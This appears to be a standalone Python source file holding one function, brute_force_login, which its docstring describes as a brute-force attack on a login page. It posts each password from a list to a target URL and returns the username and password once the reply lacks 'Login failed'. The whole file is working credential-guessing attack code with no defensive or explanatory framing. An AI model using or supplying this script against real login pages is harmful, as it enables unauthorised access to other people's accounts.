import requests
from typing import List, Optional, Tuple

def brute_force_login(url: str, username: str, password_list: List[str]) -> Optional[Tuple[str, str]]:
    """
    Perform a brute-force attack on a login page.
    
    :param url: URL of the login page.
    :param username: Username to test.
    :param password_list: List of passwords to try.
    :return: Tuple of (username, password) if successful, else None.
    """
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "Login failed" not in response.text:
            return (username, password)
    return None
